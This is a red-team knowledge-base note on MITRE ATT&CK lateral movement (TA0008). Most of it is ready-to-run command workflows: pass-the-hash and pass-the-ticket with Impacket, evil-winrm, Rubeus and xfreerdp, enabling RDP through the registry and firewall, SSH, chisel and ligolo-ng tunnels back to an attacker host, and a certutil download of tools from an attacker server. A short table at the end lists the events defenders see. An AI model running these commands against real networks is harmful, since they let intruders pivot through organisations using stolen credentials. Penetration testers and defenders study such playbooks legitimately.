---
type: tactic-hub
room: red
tactic: "Lateral Movement"
tactic_id: "TA0008"
tags: [red/lateral-movement, mitre/TA0008]
date_updated: {{date}}
---

# TA0008 — Lateral Movement

> [!quote]
> *"The world is full of obvious things which nobody by any chance ever observes."*

**MITRE Reference:** [TA0008](https://attack.mitre.org/tactics/TA0008/) | **Kill Chain Phase:** Lateral Movement

The adversary is trying to move through the environment. One machine is a starting point. The crown jewels are elsewhere. Lateral movement is the art of pivoting — using footholds, credentials, and trust relationships to reach deeper into the network.

---

## Techniques in This Tactic

| Technique ID | Name | Platform |
|-------------|------|---------|
| [[T1021 - Remote Services]] | PsExec / WinRM / RDP / SSH | All |
| [[T1550 - Use Alternate Authentication Material]] | Pass-the-Hash / Pass-the-Ticket | Windows |
| [[T1563 - Remote Service Session Hijacking]] | RDP/SSH session hijacking | All |
| [[T1534 - Internal Spearphishing]] | Internal phishing | All |
| [[T1570 - Lateral Tool Transfer]] | Moving tools across hosts | All |
| [[T1080 - Taint Shared Content]] | Poisoning shared drives | Windows |
| [[T1210 - Exploitation of Remote Services]] | Exploit internal services | All |

---

## The Standard Kit

| Tool | Role | Platform |
|------|------|---------|
| `psexec.py` | Impacket SMB exec | Windows |
| `wmiexec.py` | Impacket WMI exec | Windows |
| `evil-winrm` | WinRM interactive shell | Windows |
| `smbclient.py` | SMB file access | Windows |
| `ssh` | SSH pivot | Linux/macOS |
| `chisel` | TCP tunnel over HTTP | All |
| `ligolo-ng` | Transparent proxy pivot | All |
| `sshuttle` | VPN over SSH | Linux |
| `netexec` | Multi-protocol lateral movement | Windows/AD |
| `xfreerdp` | RDP from Linux | Windows |

---

## Standard Lateral Movement Workflows

### SMB — PsExec-style (T1021.002)
```bash
# Impacket psexec (creates service — noisy)
psexec.py <domain>/<user>:<pass>@<target>
psexec.py -hashes :<ntlm_hash> <domain>/Administrator@<target>

# Impacket wmiexec (no service, stealthier)
wmiexec.py <domain>/<user>:<pass>@<target> "cmd /c whoami"
wmiexec.py -hashes :<ntlm_hash> Administrator@<target>

# Impacket smbexec (writes to ADMIN$ — medium noise)
smbexec.py <domain>/<user>:<pass>@<target>
```

### WinRM (T1021.006)
```bash
# From Linux — evil-winrm
evil-winrm -i <target> -u <user> -p <pass>
evil-winrm -i <target> -u <user> -H <ntlm_hash>

# Upload / download files in evil-winrm session
upload /local/path/file.exe C:\Temp\file.exe
download C:\Temp\output.txt /local/output.txt

# From Windows PowerShell
Enter-PSSession -ComputerName <target> -Credential (Get-Credential)
Invoke-Command -ComputerName <target> -ScriptBlock { whoami } -Credential $cred
```

### Pass-the-Ticket (T1550.003)
```bash
# Request a TGT and inject it
.\Rubeus.exe asktgt /user:<user> /rc4:<ntlm_hash> /domain:<domain> /dc:<dc_ip> /ptt

# Overpass-the-Hash (NTLM → Kerberos)
.\Rubeus.exe asktgt /user:<user> /rc4:<ntlm_hash> /domain:<domain> /ptt

# Verify ticket
klist

# Use ticket for SMB access
dir \\<target>\C$
```

### RDP (T1021.001)
```bash
# From Linux
xfreerdp /v:<target> /u:<user> /p:<pass> /cert-ignore
xfreerdp /v:<target> /u:Administrator /pth:<ntlm_hash> /cert-ignore

# Enable RDP if disabled (requires admin)
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=in localport=3389 action=allow
```

### SSH Pivoting (T1021.004)
```bash
# Dynamic SOCKS proxy (pivot through compromised host)
ssh -D 1080 user@<jump_host>   # Then configure proxychains

# Local port forward (access internal service)
ssh -L 8080:<internal_target>:80 user@<jump_host>

# Remote port forward (expose attacker listener inward)
ssh -R 4444:127.0.0.1:4444 user@<jump_host>

# Use proxychains through SOCKS
proxychains nmap -sT -p 22,80,443 <internal_range>
proxychains nxc smb <internal_range>
```

### Tunnelling — Chisel
```bash
# On attacker (server mode)
chisel server --port 8000 --reverse

# On target (client mode — reverse SOCKS)
.\chisel.exe client <attacker_ip>:8000 R:socks

# Configure proxychains.conf to use 127.0.0.1:1080
# Then pivot through:
proxychains nmap -sT <internal_target>
proxychains evil-winrm -i <internal_target> -u <user> -p <pass>
```

### Ligolo-ng (Transparent Proxy)
```bash
# Attacker — start proxy
./proxy -selfcert -laddr 0.0.0.0:11601

# Target — run agent
./agent -connect <attacker_ip>:11601 -ignore-cert

# In ligolo-ng console
session           # select session
ifconfig          # see target's network interfaces
start             # start tunnel

# Add route on attacker
ip route add <internal_network>/24 dev ligolo

# Now access internal network directly — no proxychains needed!
nmap -sT <internal_ip>
```

### Lateral Tool Transfer (T1570)
```bash
# SMB copy (from Linux)
smbclient //<target>/C$ -U <user>%<pass> -c "put /local/tool.exe Temp\tool.exe"

# SMB copy (Windows net use)
net use \\<target>\C$ /user:<domain>\<user> <pass>
copy tool.exe \\<target>\C$\Temp\

# HTTP server (pull from target)
python3 -m http.server 8080    # on attacker
# On target:
certutil -urlcache -f http://<attacker>:8080/tool.exe C:\Temp\tool.exe
```

---

## OPSEC Considerations

> [!warning] Lateral Movement Is Tracked in AD
> - `psexec` creates a service (Event 7045) — very loud.
> - WMI and WinRM are stealthier but still generate Event 4624 Type 3.
> - RDP Pass-the-Hash requires specific Windows version (RestrictedAdmin mode).
> - Chisel/ligolo traffic looks like HTTPS/WebSocket — but beaconing pattern is detectable.
> - Every new auth event to a new host is a potential lateral movement alert.

---

## What Blue Sees

| Activity | Log Source | Event / Indicator |
|----------|-----------|-------------------|
| PsExec | System (7045) | PSEXESVC service creation |
| WinRM | Security (4624) | Logon Type 3, WinRM port 5985 |
| RDP | Security (4624) | Logon Type 10 from unusual source |
| Pass-the-Ticket | DC Security (4768/4769) | TGT for unusual account, unusual time |
| SMB file copy | Security (5145) | Network share access |
| Chisel / tunnel | Network | Sustained connections to non-standard port |

---

## Related Notes

- [[TA0006 - Credential Access]] ← Provides the keys
- [[TA0009 - Collection]] ← What to do on each new host
- [[TA0003 - Persistence]] ← Plant persistence on each new host

↩ [[Red - Notes]] · [[Red]] · [[Mind Palace]]
